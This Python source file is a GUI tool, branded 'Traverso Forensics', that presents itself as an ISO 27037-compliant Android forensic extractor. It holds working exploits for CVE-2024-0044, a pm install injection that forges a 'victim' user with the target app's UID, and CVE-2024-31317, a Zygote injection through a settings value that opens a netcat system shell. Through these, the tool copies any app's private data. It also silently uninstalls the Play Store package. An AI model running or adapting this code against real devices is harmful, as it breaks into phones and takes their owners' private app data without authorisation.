
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import time
import hashlib
import json
import shlex
import socket
import select
from pathlib import Path
from datetime import datetime
import re
import sys

class ForensicVerification:
    """
    Forensic verification following ISO/IEC 27037:2012 guidelines
    """
    
    def __init__(self, log_callback=None):
        self.log_callback = log_callback
    
    def log(self, message, level="INFO"):
        """Log with callback"""
        if self.log_callback:
            self.log_callback(message, level)
        else:
            print(f"[{level}] {message}")
    
    def run_adb(self, command, shell=False, timeout=30):
        """Execute ADB command safely"""
        try:
            if shell:
                cmd = ["adb", "shell"] + command.split()
            else:
                cmd = ["adb"] + command.split()
            
            result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)
            return result.stdout.strip(), result.stderr.strip(), result.returncode
        except Exception as e:
            return "", str(e), -1
    
    def get_android_version(self):
        """Get Android Release Version"""
        version_str, _, _ = self.run_adb("getprop ro.build.version.release", shell=True)
        try:
            return int(version_str.split('.')[0])
        except:
            return 0

    def check_vulnerability(self):
        """Check vulnerability status based on Android Version & Tool Availability"""
        self.log("Checking vulnerability status...")
        
        android_ver = self.get_android_version()
        self.log(f"Detected Android Version: {android_ver}")

        if 9 <= android_ver <= 11:
            self.log(f"Targeting CVE-2024-31317 (Zygote Injection) for Android {android_ver}", "INFO")
            
            # --- PROFESSIONAL CHECK: Local Tools ---
            if os.path.exists("busybox-arm64"):
                self.log("✅ Local Forensic BusyBox found. Injection authorized.", "SUCCESS")
                return "CVE-2024-31317"
            else:
                self.log("⚠️ 'busybox-arm64' missing. Checking device binaries...", "WARNING")
                nc_check, _, _ = self.run_adb("which nc", shell=True)
                toybox_check, _, _ = self.run_adb("which toybox", shell=True)
                
                if "nc" in nc_check or "toybox" in toybox_check:
                    self.log("✅ Device binaries found (Standard Mode).", "SUCCESS")
                    return "CVE-2024-31317"
                else:
                    self.log("❌ No binaries found. Exploit requires 'busybox-arm64' in folder.", "ERROR")
                    return "CVE-2024-31317"

        elif android_ver >= 12:
            self.log(f"Targeting CVE-2024-0044 (Payload Injection) for Android {android_ver}", "INFO")
            patch_level, _, _ = self.run_adb("getprop ro.build.version.security_patch", shell=True)
            self.log(f"Security Patch: {patch_level}")
            try:
                year, month = patch_level.split('-')[:2]
                if (int(year) * 12 + int(month)) >= (2024 * 12 + 3):
                    self.log("⚠️ Device appears PATCHED (Date >= March 2024)", "WARNING")
                else:
                    self.log("✅ Security Patch predates March 2024", "SUCCESS")
            except: pass
            return "CVE-2024-0044"
        
        else:
            self.log("⚠️ Android version not officially supported.", "WARNING")
            return "UNKNOWN"
    
    def check_selinux(self):
        """Check SELinux status"""
        self.log("Checking SELinux status...")
        selinux, _, _ = self.run_adb("getenforce", shell=True)
        self.log(f"SELinux Mode: {selinux}")
        if selinux == "Enforcing":
            self.log("    SELinux Enforcing may limit exploit effectiveness", "WARNING")
        return selinux

    def run_pre_verification(self, package=None):
        """Run operative pre-checks following forensic standards"""
        self.log("="*60)
        self.log("STARTING PRE-EXTRACTION VERIFICATION")
        self.log("Standard: ISO/IEC 27037:2012")
        
        method = self.check_vulnerability()
        self.check_selinux()
        
        if package:
            stdout, _, code = self.run_adb(f"pm list packages {package}", shell=True)
            if package not in stdout:
                self.log(f"❌ Package {package} not found on device", "ERROR")
                return False, method
            self.log(f"✅ Package {package} verified on device", "SUCCESS")
        
        return True, method
    
    def verify_cleanup(self):
        """Verify temporary files cleaned - Chain of custody"""
        self.log("Verifying device cleanup (Chain of Custody)...")
        issues = []
        locations = ["/data/local/tmp/"]
        
        for location in locations:
            # Check for APKs
            stdout, _, _ = self.run_adb(f"ls {location}*.apk 2>/dev/null", shell=True)
            if stdout: issues.append(f"APK in {location}")
            
            # Check for Injected Tools
            stdout, _, _ = self.run_adb(f"ls {location}busybox 2>/dev/null", shell=True)
            if stdout: issues.append(f"Forensic Binary in {location}")

        if len(issues) == 0:
            self.log("✅ Device cleanup verified - No artifacts remain", "SUCCESS")
        else:
            self.log(f"⚠️  Cleanup incomplete: {issues}", "WARNING")
            self.run_adb("rm /data/local/tmp/busybox", shell=True) # Emergency cleanup
        
        return len(issues) == 0
    
    def verify_victim_user(self):
        """Check victim user status"""
        stdout, stderr, code = self.run_adb("run-as victim id", shell=True)
        if code == 0:
            self.log("ℹ️  'victim' user active (will reset on reboot)", "INFO")
        else:
            self.log("✅ 'victim' user not present", "SUCCESS")

    def run_post_verification(self):
        """Run post-extraction checks"""
        self.log("="*60)
        self.log("STARTING POST-EXTRACTION VERIFICATION")
        self.verify_cleanup()
        self.verify_victim_user()
        self.log("="*60)


class TraversoForensicsGUI:
    """
    Traverso Forensics - Professional Android Extraction Suite v1.0
    """
    
    def __init__(self, root):
        self.root = root
        self.root.title("Traverso Forensics - Professional Extraction Suite v1.0")
        self.root.geometry("1200x850")
        self.root.configure(bg="#1e1e1e") # ORIGINAL COLOR PRESERVED
        self.root.resizable(True, True)
        
        # Variables
        self.device_connected = tk.BooleanVar(value=False)
        self.selected_package = tk.StringVar()
        self.selected_uid = tk.StringVar()
        self.apps_list = []
        self.log_buffer = []
        self.extraction_dir = None
        self.stop_event = threading.Event()
        
        # Verification system
        self.verifier = None
        
        # Setup UI (ORIGINAL STRUCTURE)
        self.setup_styles()
        self.create_header()
        self.create_main_panels()
        self.create_footer()
        
        # Auto-detect device on startup
        self.root.after(500, self.auto_detect_device)
    
    def setup_styles(self):
        """Setup dark theme colors - ORIGINAL PALETTE"""
        self.bg_dark = "#1e1e1e"
        self.bg_panel = "#2d2d2d"
        self.bg_input = "#3e3e3e"
        self.fg_text = "#f0f0f0"
        self.fg_secondary = "#a0a0a0"
        self.accent_green = "#2ecc71"
        self.accent_blue = "#3498db"
        self.accent_red = "#e74c3c"
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("blue.Horizontal.TProgressbar",
                       troughcolor=self.bg_input,
                       background=self.accent_blue,
                       bordercolor=self.bg_panel,
                       lightcolor=self.accent_blue,
                       darkcolor=self.accent_blue)
    
    def create_header(self):
        """Create header with logo"""
        header = tk.Frame(self.root, bg=self.bg_dark, height=90)
        header.pack(fill=tk.X, side=tk.TOP)
        header.pack_propagate(False)
        
        # Logo Logic Preserved
        logo_path = "traverso_logo.png"
        try:
            if os.path.exists(logo_path):
                logo = tk.PhotoImage(file=logo_path)
                logo = logo.subsample(10, 10)
                logo_label = tk.Label(header, image=logo, bg=self.bg_dark)
                logo_label.image = logo
                logo_label.pack(side=tk.LEFT, padx=20)
        except: pass
        
        # Title
        title_frame = tk.Frame(header, bg=self.bg_dark)
        title_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        tk.Label(title_frame, text="Traverso Forensics",
                font=("Segoe UI", 24, "bold"),
                foreground="white",
                background=self.bg_dark).pack(anchor=tk.W, pady=(15, 0))
        
        tk.Label(title_frame, text="Professional Android Extraction (Multi-Exploit / ISO 27037) EXPLOIT: CVE-2024-0044 (Android 12, 13) - CVE-2024-31317 (Android 9, 10, 11)",
                font=("Segoe UI", 10),
                foreground=self.fg_secondary,
                background=self.bg_dark).pack(anchor=tk.W)
    
    def create_main_panels(self):
        container = tk.Frame(self.root, bg=self.bg_dark)
        container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left panel
        left_panel = self.create_left_panel(container)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        # Right panel
        right_panel = self.create_right_panel(container)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
    
    def create_left_panel(self, parent):
        panel = tk.Frame(parent, bg=self.bg_panel)
        
        # Device Status
        status_header = tk.Frame(panel, bg=self.bg_panel)
        status_header.pack(fill=tk.X, padx=15, pady=(15, 5))
        
        tk.Label(status_header, text="Device Status", font=("Segoe UI", 12, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
        
        tk.Button(status_header, text="🔄 Refresh", bg=self.accent_blue, fg="white",
                 font=("Segoe UI", 9, "bold"), relief=tk.FLAT, padx=15, pady=4, cursor="hand2",
                 command=self.check_device).pack(side=tk.RIGHT)
        
        # Indicator
        ind_frame = tk.Frame(panel, bg=self.bg_input, bd=2)
        ind_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
        
        top_ind = tk.Frame(ind_frame, bg=self.bg_input)
        top_ind.pack(fill=tk.X, padx=10, pady=(10, 5))
        
        self.status_indicator = tk.Label(top_ind, text="●", font=("Segoe UI", 16),
                                        foreground=self.accent_red, background=self.bg_input)
        self.status_indicator.pack(side=tk.LEFT, padx=(0, 10))
        
        self.connection_status_label = tk.Label(top_ind, text="No device detected",
                                              font=("Segoe UI", 11, "bold"),
                                              foreground=self.accent_red, background=self.bg_input)
        self.connection_status_label.pack(side=tk.LEFT)
        
        self.device_text = scrolledtext.ScrolledText(ind_frame, height=3, bg=self.bg_input,
                                                    fg=self.fg_secondary, font=("Consolas", 9),
                                                    relief=tk.FLAT, borderwidth=0)
        self.device_text.pack(fill=tk.BOTH, padx=10, pady=(0, 10))
        self.device_text.insert(1.0, "Connect device via USB and enable USB debugging.")
        self.device_text.config(state=tk.DISABLED)
        
        # Buttons
        btn_frame = tk.Frame(panel, bg=self.bg_panel)
        btn_frame.pack(fill=tk.X, padx=15, pady=(5, 15))
        
        tk.Button(btn_frame, text="Detect Device", bg=self.accent_green, fg="white",
                 font=("Segoe UI", 10, "bold"), relief=tk.FLAT, padx=20, pady=8,
                 command=self.check_device).pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 5))
        
        self.listapps_btn = tk.Button(btn_frame, text="List All Apps", bg=self.bg_input,
                                     fg=self.fg_text, font=("Segoe UI", 10, "bold"),
                                     relief=tk.FLAT, padx=20, pady=8, state=tk.DISABLED,
                                     command=self.list_all_apps)
        self.listapps_btn.pack(side=tk.RIGHT, expand=True, fill=tk.X, padx=(5, 0))
        
        # Apps List
        tk.Label(panel, text="Applications List", font=("Segoe UI", 12, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 5))
        
        # Search
        search_frame = tk.Frame(panel, bg=self.bg_panel)
        search_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        self.search_var = tk.StringVar()
        self.search_var.trace('w', lambda *args: self.filter_apps())
        
        tk.Entry(search_frame, textvariable=self.search_var, bg=self.bg_input, fg=self.fg_text,
                font=("Segoe UI", 9), relief=tk.FLAT).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=5)
        
        # Listbox
        apps_frame = tk.Frame(panel, bg=self.bg_input)
        apps_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        sb = tk.Scrollbar(apps_frame, bg=self.bg_input)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.apps_listbox = tk.Listbox(apps_frame, bg=self.bg_input, fg=self.fg_text,
                                      font=("Consolas", 9), relief=tk.FLAT, borderwidth=0,
                                      selectbackground=self.accent_blue, selectforeground="white",
                                      yscrollcommand=sb.set)
        self.apps_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        sb.config(command=self.apps_listbox.yview)
        self.apps_listbox.bind('<<ListboxSelect>>', self.on_app_select)
        
        return panel

    def create_right_panel(self, parent):
        panel = tk.Frame(parent, bg=self.bg_panel)
        
        # Info
        tk.Label(panel, text="Selected Application", font=("Segoe UI", 12, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
        
        info = tk.Frame(panel, bg=self.bg_panel)
        info.pack(fill=tk.X, padx=15, pady=10)
        
        tk.Label(info, text="Package:", font=("Segoe UI", 9, "bold"), bg=self.bg_panel, fg=self.fg_secondary).pack(anchor=tk.W)
        self.package_label = tk.Label(info, text="None", font=("Segoe UI", 10), bg=self.bg_panel, fg=self.fg_text)
        self.package_label.pack(anchor=tk.W, pady=(0, 10))
        
        tk.Label(info, text="UID:", font=("Segoe UI", 9, "bold"), bg=self.bg_panel, fg=self.fg_secondary).pack(anchor=tk.W)
        self.uid_label = tk.Label(info, text="None", font=("Segoe UI", 10), bg=self.bg_panel, fg=self.fg_text)
        self.uid_label.pack(anchor=tk.W)
        
        # Progress
        self.progress = ttk.Progressbar(panel, mode='determinate', length=300, style="blue.Horizontal.TProgressbar")
        self.progress.pack(fill=tk.X, padx=15, pady=(10, 5))
        self.progress_label = tk.Label(panel, text="", bg=self.bg_panel, fg=self.fg_text, font=("Segoe UI", 9))
        self.progress_label.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        # START BUTTON
        self.start_btn = tk.Button(panel, text="Start Forensic Extraction", bg=self.bg_input,
                                  fg=self.fg_text, font=("Segoe UI", 11, "bold"), relief=tk.FLAT,
                                  padx=20, pady=12, state=tk.DISABLED, command=self.start_extraction)
        self.start_btn.pack(fill=tk.X, padx=15, pady=10)
        
        # Log
        tk.Label(panel, text="Extraction Log", font=("Segoe UI", 10, "bold"),
                fg=self.fg_text, bg=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 5))
        
        log_frame = tk.Frame(panel, bg=self.bg_input)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        self.log_text = scrolledtext.ScrolledText(log_frame, bg=self.bg_input, fg=self.fg_text,
                                                 font=("Consolas", 9), relief=tk.FLAT, borderwidth=0)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.insert(1.0, "System Ready. Waiting for device...\n")
        self.log_text.config(state=tk.DISABLED)
        
        return panel

    def create_footer(self):
        footer = tk.Frame(self.root, bg=self.bg_panel, height=40)
        footer.pack(fill=tk.X, side=tk.BOTTOM)
        footer.pack_propagate(False)
        
        self.status_label = tk.Label(footer, text="Status: Idle", font=('Segoe UI', 9),
                                    fg=self.fg_secondary, bg=self.bg_panel)
        self.status_label.pack(side=tk.LEFT, padx=20)
        
        tk.Label(footer, text="ISO/IEC 27037:2012 Compliant", font=("Segoe UI", 8),
                fg="#555555", bg=self.bg_panel).pack(side=tk.RIGHT, padx=20)

    # --- LOGIC & HELPERS ---
    
    def write_log(self, message, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        prefix = "✅" if level=="SUCCESS" else "⚠️ " if level=="WARNING" else "❌" if level=="ERROR" else "ℹ️ "
        entry = f"[{timestamp}] {prefix} {message}\n"
        self.log_buffer.append(f"[{timestamp}] [{level}] {message}")
        self.root.after(0, lambda: self._append_log(entry))
    
    def _append_log(self, text):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, text)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def update_device_status(self, connected, message, details=""):
        color = self.accent_green if connected else self.accent_red
        self.status_indicator.config(foreground=color)
        self.connection_status_label.config(text=message, foreground=color)
        self.device_text.config(state=tk.NORMAL)
        self.device_text.delete(1.0, tk.END)
        self.device_text.insert(1.0, details)
        self.device_text.config(state=tk.DISABLED)

    def update_progress(self, val, total, msg):
        pct = (val/total)*100
        self.root.after(0, lambda: self.progress.configure(value=pct))
        self.root.after(0, lambda: self.progress_label.config(text=msg))

    # --- ADB & DEVICE ---
    
    def auto_detect_device(self):
        self.check_device()

    def check_device(self):
        self.update_device_status(False, "Checking...", "Scanning for devices...")
        threading.Thread(target=self._check_device_thread, daemon=True).start()
    
    def _check_device_thread(self):
        # 1. Check ADB
        res = subprocess.run(["adb", "version"], capture_output=True)
        if res.returncode != 0:
            self.update_device_status(False, "ADB Error", "ADB not found in PATH.")
            return

        # 2. Start Server
        subprocess.run(["adb", "start-server"], capture_output=True)
        
        # 3. List Devices
        res = subprocess.run(["adb", "devices"], capture_output=True, text=True)
        devices = [line for line in res.stdout.split('\n')[1:] if 'device' in line]
        
        if not devices:
            self.device_connected.set(False)
            self.update_device_status(False, "No Device", "Connect USB & Enable Debugging.")
            return

        self.device_connected.set(True)
        
        # 4. Get Info
        model = subprocess.run(["adb", "shell", "getprop", "ro.product.model"], capture_output=True, text=True).stdout.strip()
        ver = subprocess.run(["adb", "shell", "getprop", "ro.build.version.release"], capture_output=True, text=True).stdout.strip()
        
        info = f"Model: {model}\nAndroid: {ver}"
        self.update_device_status(True, "Connected", info)
        self.write_log(f"Device Connected: {model} (Android {ver})", "SUCCESS")
        
        self.root.after(0, lambda: self.listapps_btn.config(state=tk.NORMAL, bg=self.accent_blue))

    def list_all_apps(self):
        self.write_log("Listing apps...", "INFO")
        threading.Thread(target=self._fetch_apps_thread, daemon=True).start()

    def _fetch_apps_thread(self):
        res = subprocess.run(["adb", "shell", "pm", "list", "packages", "-U"], capture_output=True, text=True, errors='ignore')
        self.apps_list = []
        
        for line in res.stdout.splitlines():
            if "package:" in line and "uid:" in line:
                try:
                    parts = line.split()
                    pkg = parts[0].replace("package:", "")
                    uid = parts[1].replace("uid:", "")
                    self.apps_list.append({'package': pkg, 'uid': uid})
                except: pass
        
        self.write_log(f"Found {len(self.apps_list)} apps.", "SUCCESS")
        self.filter_apps()

    def filter_apps(self):
        self.apps_listbox.delete(0, tk.END)
        term = self.search_var.get().lower()
        for app in self.apps_list:
            if term in app['package'].lower():
                self.apps_listbox.insert(tk.END, f"{app['package']} (UID: {app['uid']})")

    def on_app_select(self, event):
        sel = self.apps_listbox.curselection()
        if not sel: return
        txt = self.apps_listbox.get(sel[0])
        pkg = txt.split(" (UID:")[0]
        uid = txt.split("UID: ")[1].rstrip(")")
        
        self.selected_package.set(pkg)
        self.selected_uid.set(uid)
        self.package_label.config(text=pkg)
        self.uid_label.config(text=uid)
        self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)

    # --- EXTRACTION CORE ---

    def calculate_hash256(self, filepath):
        sha = hashlib.sha256()
        with open(filepath, 'rb') as f:
            while chunk := f.read(8192):
                sha.update(chunk)
        return sha.hexdigest()

    def save_log_file(self):
        if not self.extraction_dir: return
        path = os.path.join(self.extraction_dir, "extraction_log.txt")
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write("TRAVERSO FORENSICS LOG\n======================\n")
                for l in self.log_buffer: f.write(l + "\n")
            self.write_log("Log file saved.", "SUCCESS")
        except: pass

    def generate_details_report(self, package, method_name, extraction_dir):
        """Generates detailed extraction metadata file"""
        try:
            version = "Unknown"
            v_res = subprocess.run(["adb", "shell", f"dumpsys package {package} | grep versionName"], capture_output=True, text=True)
            if v_res.stdout:
                version = v_res.stdout.strip().replace("versionName=", "")
            
            now = datetime.now().astimezone()
            
            with open(os.path.join(extraction_dir, "detalles_extraccion.txt"), 'w', encoding='utf-8') as f:
                f.write("REPORTE DE EXTRACCIÓN FORENSE\n=============================\n")
                f.write(f"Aplicación: {package}\n")
                f.write(f"Versión: {version}\n")
                f.write(f"Método: {method_name}\n")
                f.write(f"Fecha: {now.strftime('%d/%m/%Y %H:%M:%S')}\n")
                f.write(f"Timezone: {now.tzname()}\n")
            return True
        except: return False

    def start_extraction(self):
        pkg = self.selected_package.get()
        if not pkg: return
        
        self.log_buffer = []
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.start_btn.config(state=tk.DISABLED)
        
        threading.Thread(target=self.run_extraction_process, args=(pkg,), daemon=True).start()

    def run_extraction_process(self, package):
        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.extraction_dir = f"extraction_{package.replace('.','_')}_{ts}"
            os.makedirs(self.extraction_dir, exist_ok=True)
            
            self.verifier = ForensicVerification(log_callback=self.write_log)
            
            self.update_progress(10, 100, "Verifying environment...")
            success, method = self.verifier.run_pre_verification(package)
            
            if not success:
                self.write_log("Verification Failed.", "ERROR")
                return

            tar_file = os.path.join(self.extraction_dir, f"{package.replace('.','_')}_backup.tar")
            
            if method == "CVE-2024-0044":
                self.execute_cve_2024_0044(package, self.selected_uid.get(), tar_file)
            elif method == "CVE-2024-31317":
                self.execute_cve_2024_31317(package, tar_file)
            else:
                self.write_log("Unknown vulnerability status. Aborting.", "ERROR")
                return

            if os.path.exists(tar_file) and os.path.getsize(tar_file) > 1024:
                self.update_progress(90, 100, "Hashing...")
                h = self.calculate_hash256(tar_file)
                
                with open(os.path.join(self.extraction_dir, f"{package}_backup_SHA256.txt"), 'w') as f:
                    f.write(f"File: {os.path.basename(tar_file)}\nSHA256: {h}\n")
                
                self.write_log(f"Hash SHA256: {h}", "SUCCESS")
                self.generate_details_report(package, method, self.extraction_dir)
                
                self.verifier.run_post_verification()
                self.save_log_file()
                
                self.update_progress(100, 100, "Complete")
                messagebox.showinfo("Success", f"Extraction Complete!\nMethod: {method}\nFolder: {self.extraction_dir}")
            else:
                self.write_log("Extraction failed or file empty.", "ERROR")
                self.update_progress(0, 100, "Failed")

        except Exception as e:
            self.write_log(f"Critical Error: {e}", "ERROR")
        finally:
            self.start_btn.config(state=tk.NORMAL)

    # -------------------------------------------------------------------------
    # EXPLOIT: CVE-2024-0044 (Android 12, 13, 14)
    # -------------------------------------------------------------------------
    def execute_cve_2024_0044(self, package, uid, output_file):
        self.update_progress(30, 100, "Injecting Payload (CVE-2024-0044)...")
        self.write_log("Preparing Payload Injection...", "INFO")
        
        apk_path = "traverso.apk"
        if not os.path.exists(apk_path):
             self.write_log("traverso.apk missing! Cannot proceed.", "ERROR")
             return

        subprocess.run(["adb", "push", apk_path, "/data/local/tmp/traverso.apk"], capture_output=True)
        
        payload = f"@null\nvictim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
        cmd = f"pm install -i {shlex.quote(payload)} /data/local/tmp/traverso.apk"
        subprocess.run(["adb", "shell", cmd], capture_output=True)
        
        self.update_progress(60, 100, "Streaming Data...")
        self.write_log("Streaming TAR data via run-as...", "INFO")
        
        cmd_extract = f"run-as victim tar -cf - /data/data/{package} 2>/dev/null"
        
        with open(output_file, 'wb') as f:
            proc = subprocess.Popen(["adb", "shell", cmd_extract], stdout=f, stderr=subprocess.PIPE)
            proc.communicate()
        
        subprocess.run(["adb", "shell", "rm /data/local/tmp/traverso.apk"], capture_output=True)
        subprocess.run(["adb", "shell", "pm uninstall com.android.vending"], capture_output=True)

    # -------------------------------------------------------------------------
    # EXPLOIT: CVE-2024-31317 (Android 9, 10, 11) - PROFESSIONAL EDITION
    # -------------------------------------------------------------------------
    def execute_cve_2024_31317(self, package, output_file):
        self.update_progress(20, 100, "Initializing Zygote Injection (Professional Mode)...")
        self.write_log("Starting Zygote Injection Exploit...", "INFO")

        # 1. TOOL INJECTION (Professional Forensic Standard)
        nc_cmd = "nc"
        if os.path.exists("busybox-arm64"):
            self.write_log("Injecting Forensic Binary (BusyBox)...", "INFO")
            subprocess.run(["adb", "push", "busybox-arm64", "/data/local/tmp/busybox"], capture_output=True)
            subprocess.run(["adb", "shell", "chmod 755 /data/local/tmp/busybox"], capture_output=True)
            nc_cmd = "/data/local/tmp/busybox nc"
            self.write_log("Tool Injection Successful. Using local binary.", "SUCCESS")
        else:
            self.write_log("Local binary missing. Attempting device detection...", "WARNING")
            res = subprocess.run(["adb", "shell", "which toybox"], capture_output=True, text=True)
            if "toybox" in res.stdout: nc_cmd = "toybox nc"

        # 2. Prepare Payload
        zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{nc_cmd} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
        
        raw_args = [
            "--runtime-args", "--setuid=1000", "--setgid=1000",
            "--runtime-flags=1", "--mount-external-full",
            "--setgroups=3003", "--nice-name=forensic_shell",
            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=29:complete",
            "--invoke-with", zygote_cmd
        ]
        zygote_args = "\n".join([f"{len(raw_args):d}"] + raw_args)
        
        ver = self.verifier.get_android_version()
        if ver < 12:
            payload = f"LClass1;->method1(\n{zygote_args}"
        else:
            payload = "\n" * 3000 + "A" * 5157 + zygote_args + "," + ",\n" * 1400

        # 3. Inject
        self.update_progress(40, 100, "Injecting into Settings Provider...")
        exploit_cmd = f'settings put global hidden_api_blacklist_exemptions "{payload}"'
        subprocess.run(["adb", "shell", exploit_cmd], capture_output=True)
        
        # 4. Trigger & Wait (POLLING)
        subprocess.run(["adb", "shell", "am force-stop com.android.settings"], capture_output=True)
        self.write_log("Waiting for exploit trigger...", "INFO")
        time.sleep(1.5)
        subprocess.run(["adb", "shell", "settings delete global hidden_api_blacklist_exemptions"], capture_output=True)

        # 5. Connect and Extract
        self.update_progress(50, 100, "Establishing connection...")
        try:
            subprocess.run(["adb", "forward", "tcp:4321", "tcp:4321"], capture_output=True)
            time.sleep(1)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(('127.0.0.1', 4321))
            self.write_log("Connected to Zygote Shell!", "SUCCESS")
            
            self.update_progress(60, 100, "Streaming data from socket...")
            self.write_log(f"Pulling /data/data/{package}...", "INFO")
            
            cmd = f"tar cf - /data/data/{package} 2>/dev/null\nexit\n"
            sock.sendall(cmd.encode('utf-8'))
            
            sock.settimeout(30)
            first_chunk = True
            with open(output_file, 'wb') as f:
                while True:
                    try:
                        data = sock.recv(32768)
                        if not data: break
                        if first_chunk:
                            if len(data) > 100 and (b"data/" in data or b"com." in data): pass 
                            else: self.write_log("⚠️ Warning: Stream header does not look like standard TAR.", "WARNING")
                            first_chunk = False
                        f.write(data)
                    except socket.timeout: break
            
            sock.close()
            subprocess.run(["adb", "forward", "--remove", "tcp:4321"], capture_output=True)
            
            # 6. Cleanup Injected Tool
            if os.path.exists("busybox-arm64"):
                self.write_log("Removing forensic binary from device...", "INFO")
                subprocess.run(["adb", "shell", "rm /data/local/tmp/busybox"], capture_output=True)
            
        except Exception as e:
            self.write_log(f"Exploit Connection Failed: {e}", "ERROR")

if __name__ == "__main__":
    root = tk.Tk()
    app = TraversoForensicsGUI(root)
    root.mainloop()

